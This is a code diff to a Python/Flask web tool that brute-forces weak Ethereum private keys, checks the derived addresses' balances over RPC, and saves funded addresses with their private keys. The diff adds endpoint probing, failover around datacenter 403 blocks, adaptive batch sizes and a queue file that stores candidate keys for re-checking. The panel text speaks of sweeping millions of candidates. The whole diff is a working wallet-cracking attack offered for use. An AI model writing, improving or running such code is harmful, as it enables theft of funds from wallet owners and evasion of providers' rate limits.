-    log("[eth] done — %d hit(s), %s empty candidate(s) skipped, %s unchecked"
+    if pending:
+        if job.get("eth_no_rpc"):
+            _eth_queue_pending(pending, job, log, "no RPC endpoint answered")
+        else:
+            saved, _stopped = _eth_flush(pending, log, job, lambda: job["stop"])
+            hits += saved
+    log("[eth] done — %d hit(s), %s empty candidate(s) skipped, %s queued for "
+        "re-check in %s, %s dropped, %s unchecked (verification off)"
         % (len(hits), format(job.get("eth_skipped", 0), ","),
-           format(job.get("eth_unchecked", 0) + job.get("throttled", 0), ",")))
+           format(job.get("eth_queued", 0), ","), _eth_pending_path(),
+           format(job.get("eth_dropped", 0), ","),
+           format(job.get("eth_unchecked", 0), ",")))
     return hits
 
 
@@ -3696,6 +4159,11 @@ def attack_eth_weakkeys(count, extra_keys, log, job):
         return []
     log("[eth] weak keys: 1..%s plus %d pasted key(s)  EC: %s  hash: %s"
         % (format(count, ","), len(extra), EC_BACKEND, ETH_HASH_BACKEND))
+    if ETH_VERIFY_BALANCES:
+        if not _eth_preflight(log, job):
+            job["detail"] = ("no RPC endpoint answered — nothing derived; set "
+                             "ETH_RPC_URLS")
+            return []
     if not ETH_VERIFY_BALANCES:
         log("[eth] ETH_VERIFY_BALANCES=0 — candidates are NOT checked and NOT "
             "saved; they are only counted as unchecked")
@@ -3730,7 +4198,7 @@ def attack_eth_weakkeys(count, extra_keys, log, job):
                             "found_at": datetime.now(
                                 timezone.utc).isoformat(timespec="seconds")})
         done += 1
-        if len(pending) >= ETH_RPC_BATCH:
+        if len(pending) >= _eth_batch_size():
             batch, pending = pending, []
             seen_batch.clear()
             saved, stopped = _eth_flush(batch, log, job, lambda: job["stop"])
@@ -3740,20 +4208,26 @@ def attack_eth_weakkeys(count, extra_keys, log, job):
         if done % 500 == 0:
             rate = done / max(time.time() - t0, 0.001)
             job["progress"] = min(1.0, done / total)
-            job["detail"] = ("%s/%s keys  %.0f key/s  hits=%d  unchecked=%s  "
-                             "throttled=%s  eta ~%.1f min"
+            job["detail"] = ("%s/%s keys  %.0f key/s  hits=%d  queued=%s  "
+                             "throttled=%s  batch=%d  eta ~%.1f min"
                              % (format(done, ","), format(total, ","), rate,
                                 len(hits),
-                                format(job.get("eth_unchecked", 0), ","),
+                                format(job.get("eth_queued", 0), ","),
                                 format(job.get("throttled", 0), ","),
+                                _eth_batch_size(),
                                 (total - done) / max(rate, 0.001) / 60))
-    if pending and not stopped:
-        saved, stopped = _eth_flush(pending, log, job, lambda: job["stop"])
-        hits += saved
+    if pending:
+        if job.get("eth_no_rpc"):
+            _eth_queue_pending(pending, job, log, "no RPC endpoint answered")
+        else:
+            saved, _stopped = _eth_flush(pending, log, job, lambda: job["stop"])
+            hits += saved
     job["progress"] = min(1.0, done / total) if total else 1.0
-    log("[eth] done — %d hit(s) from %s key(s), %s empty skipped"
+    log("[eth] done — %d hit(s) from %s key(s), %s empty skipped, %s queued "
+        "for re-check in %s"
         % (len(hits), format(done, ","),
-           format(job.get("eth_skipped", 0), ",")))
+           format(job.get("eth_skipped", 0), ","),
+           format(job.get("eth_queued", 0), ","), _eth_pending_path()))
     return hits
 
 
@@ -3795,9 +4269,11 @@ def verify_eth_balances(force, log, job):
         job["detail"] = "no addresses to check"
         return
     total = len(addrs)
-    log("[eth-verify] checking %s address(es) in batches of %d against %s"
-        % (format(total, ","), ETH_RPC_BATCH,
-           _esplora_status(_ETH_RPC_BASES)))
+    log("[eth-verify] checking %s address(es) — endpoints: %s"
+        % (format(total, ","), _eth_status()))
+    if not _eth_preflight(log, job):
+        job["detail"] = "no RPC endpoint answered"
+        return
     t0 = time.time()
     funded = never_used = emptied = errors = checked = 0
     pending = list(addrs)
@@ -3811,23 +4287,28 @@ def verify_eth_balances(force, log, job):
             log("[eth-verify] pass %d/%d: retrying %s throttled address(es) "
                 "in %.0fs — %s"
                 % (passes, VERIFY_RETRY_PASSES + 1, format(len(batch_all), ","),
-                   wait, _esplora_status(_ETH_RPC_BASES)))
+                   wait, _eth_status()))
             try:
                 _esplora_sleep(wait, lambda: job["stop"])
             except RuntimeError:
                 log("[eth-verify] stopped by user")
                 break
-        for off in range(0, len(batch_all), ETH_RPC_BATCH):
+        for off in range(0, len(batch_all), _eth_batch_size()):
             if job["stop"]:
                 log("[eth-verify] stopped by user")
                 stopped = True
                 break
-            chunk = batch_all[off:off + ETH_RPC_BATCH]
+            chunk = batch_all[off:off + _eth_batch_size()]
             try:
                 res = _eth_balances(chunk, lambda: job["stop"])
             except RuntimeError as e:
                 if "stopped by user" in str(e):
                     log("[eth-verify] stopped by user")
+                    stopped = True
+                    break
+                if isinstance(e, _EthNoEndpoint):
+                    log("[eth-verify] every endpoint refused us: %s" % e)
+                    pending += batch_all[off:]
                     stopped = True
                     break
                 pending += chunk                 # throttled: retry later
@@ -3967,16 +4448,37 @@ RPC time.</p>
 <p id="detailWk" class="muted"></p><pre id="logWk"></pre>
 </div>
 <div class="card"><h2>RPC endpoints</h2>
-<p class="muted">Balances come from {bases}. Public endpoints rate-limit; a 429
-parks that endpoint and fails over to the next one, and throttled batches are
-retried rather than recorded as errors. Set <code>ETH_RPC_URLS</code> to use
-your own node — that is the only way to sweep millions of candidates quickly.
-Test them before a long run:</p>
+<p class="muted">Balances come from {bases}. Every run starts with a
+<b>pre-flight probe</b> of those endpoints and uses only the ones that answer:
+public endpoints reject datacenter traffic with HTTP 403 about as readily as
+they rate-limit it. A 429/5xx parks that endpoint and fails over to the next; a
+401/403 parks it for {deadcool}s; and if <b>every</b> endpoint refuses, the run
+<b>stops</b> instead of deriving candidates nobody can check. Batches start at
+{batch} addresses ({calls} calls) and halve automatically when an endpoint
+refuses arrays or a large batch. Set <code>ETH_RPC_URLS</code> to your own node —
+that is the only way to sweep millions of candidates quickly. Test them first:</p>
 <button class="btn" onclick="pingRpc()">Test RPC</button>
 <pre id="rpc">not tested</pre>
 <p class="muted">EC backend: {ec} · Keccak: {hashb} · min balance to save:
-{minwei} wei · verify on: <a href="/results">/results</a> (Check ETH
-balances)</p>
+{minwei} wei · batch now: <span id="batchNow">{batch}</span> addresses ·
+endpoints: <span id="rpcState">{rpcstate}</span> · verify on:
+<a href="/results">/results</a> (Check ETH balances)</p>
+</div>
+<div class="card"><h2>Queued candidates</h2>
+<p class="muted">A batch that cannot be checked — throttled, refused, or caught
+by a Stop mid-run — is <b>appended to <code>{pendingfile}</code> instead of
+being thrown away</b>. Derivation is the expensive part (up to ~2.7 ms per
+candidate), so the queue keeps address, private key, recipe and timestamp: a
+re-check needs no re-derivation and a funded address is saved with exactly the
+payload a live sweep would have produced. <b><span
+id="pendingN">{pendingn}</span></b> candidate(s) are queued now (cap
+{pendingmax}, <code>ETH_PENDING_MAX</code>; beyond it, candidates are counted as
+dropped and the log says so).</p>
+<button class="btn" onclick="retryQueued()">Re-check queued candidates</button>
+<button class="btn danger" onclick="stop('eth_retry')">Stop</button>
+<button class="btn" onclick="refreshPending()">Refresh count</button>
+<div class="bar"><div id="barQ" style="width:0%"></div></div>
+<p id="detailQ" class="muted"></p><pre id="logQ"></pre>
 </div>
 <script>
 function preset(id,unit,s,e){
@@ -4022,9 +4524,34 @@ function pingRpc(){
     }).join(String.fromCharCode(10)) || 'no endpoints configured';
   });
 }
+function retryQueued(){ post('/api/eth/retry',{}); }
+function refreshPending(){
+  fetch('/api/eth/pending',{cache:'no-store'})
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+      const NL=String.fromCharCode(10);
+      const n=document.getElementById('pendingN');
+      if(n) n.textContent=(d.queued||0).toLocaleString('en-US');
+      const bn=document.getElementById('batchNow');
+      if(bn) bn.textContent=d.batch_size||'';
+      const st=document.getElementById('rpcState');
+      if(st) st.textContent=d.rpc||'';
+      const dq=document.getElementById('detailQ');
+      if(dq) dq.textContent=d.queued
+        ? d.queued.toLocaleString('en-US')+' candidate(s) queued in '+d.file
+        : 'queue empty ('+d.file+')';
+      const lq=document.getElementById('logQ');
+      if(lq && !lq.textContent && d.sample && d.sample.length){
+        lq.textContent='next queued: '+d.sample.join(', ');
+      }
+    }).catch(function(){});
+}
 unitChanged();
 watch('eth_ts','Ts');
 watch('eth_weak','Wk');
+watch('eth_retry','Q');
+refreshPending();
+setInterval(refreshPending, 15000);
 </script>"""
     body = (body
             .replace("{recipes}", "".join(rec))
@@ -4035,6 +4562,12 @@ watch('eth_weak','Wk');
             .replace("{maxsteps}", "{:,}".format(ETH_MAX_STEPS))
             .replace("{bases}", html.escape(", ".join(
                 x.split("//")[-1] for x in _ETH_RPC_BASES)))
+            .replace("{rpcstate}", html.escape(_eth_status()))
+            .replace("{deadcool}", "{:,.0f}".format(ETH_DEAD_COOL_SECS))
+            .replace("{pendingfile}", html.escape(ETH_PENDING_FILE))
+            .replace("{pendingmax}", "{:,}".format(ETH_PENDING_MAX)
+                     if ETH_PENDING_MAX else "none")
+            .replace("{pendingn}", "{:,}".format(_eth_pending_count()))
             .replace("{ec}", html.escape(EC_BACKEND))
             .replace("{hashb}", html.escape(ETH_HASH_BACKEND))
             .replace("{minwei}", "{:,}".format(ETH_MIN_WEI)))
@@ -4051,6 +4584,14 @@ def api_eth_recipes():
                           for u in _ETH_RPC_BASES],
             "rpc_status": _esplora_status(_ETH_RPC_BASES),
             "batch_addresses": ETH_RPC_BATCH,
+            "batch_size_now": _eth_batch_size(),
+            "preflight": ETH_PREFLIGHT,
+            "rpc_rounds": ETH_RPC_ROUNDS,
+            "dead_cool_secs": ETH_DEAD_COOL_SECS,
+            "error_cool_secs": ETH_ERROR_COOL_SECS,
+            "pending_queued": _eth_pending_count(),
+            "pending_file": str(_eth_pending_path()),
+            "pending_max": ETH_PENDING_MAX,
             "min_wei": ETH_MIN_WEI,
             "verify_balances": ETH_VERIFY_BALANCES,
             "max_steps": ETH_MAX_STEPS,
@@ -4128,6 +4669,28 @@ def api_eth_ping():
     ok = sum(1 for x in bases if x["ok"])
     return {"ok": ok > 0, "msg": "%d/%d endpoint(s) answered" % (ok, len(bases)),
             "bases": bases, "batch_addresses": ETH_RPC_BATCH}
+
+
+@app.route("/api/eth/pending")
+def api_eth_pending():
+    """How many candidates are waiting for a working RPC endpoint."""
+    return {"ok": True, "queued": _eth_pending_count(),
+            "file": str(_eth_pending_path()), "cap": ETH_PENDING_MAX,
+            "sample": [r.get("address") for r in _eth_pending_read(5)],
+            "batch_size": _eth_batch_size(), "rpc": _eth_status(),
+            "rpc_bases": [{"url": u, "host": _eth_host(u)} for u in _ETH_RPC_BASES],
+            "active_bases": [{"url": u, "host": _eth_host(u)} for u in _eth_bases()],
+            "preflight": ETH_PREFLIGHT}
+
+
+@app.route("/api/eth/retry", methods=["POST"])
+def api_eth_retry():
+    """Drain eth_pending.jsonl: re-check queued candidates, save the hits."""
+    if not _eth_pending_count():
+        return {"ok": False, "msg": "nothing queued — %s is empty"
+                % _eth_pending_path().name}
+    ok, msg = _start_job("eth_retry", retry_eth_pending)
+    return {"ok": ok, "msg": msg}
 
 
 @app.route("/api/eth/verify", methods=["POST"])
